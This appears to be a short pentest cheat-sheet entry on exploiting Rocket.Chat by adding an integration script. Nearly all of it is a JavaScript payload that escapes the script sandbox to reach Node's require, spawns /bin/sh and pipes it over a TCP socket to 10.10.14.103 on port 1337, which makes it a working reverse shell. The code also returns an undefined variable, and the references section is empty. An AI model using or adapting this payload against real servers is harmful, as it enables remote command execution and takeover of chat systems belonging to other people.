# Rocket.Chat - Add an integration script

## Requirements

 - Username and password of an account with rights to access to "Software packages Updates"

## Exploitation

```js
class Script {
  process_incoming_request({ request }) {
    const require = console.log.constructor('return process.mainModule.require')();
    const { execSync } = require('child_process');
    
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    
    client.connect(1337, "10.10.14.103", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    
    return {
      content:{
        text: JSON.stringify(res)
      }
    }
  }
}
```

## References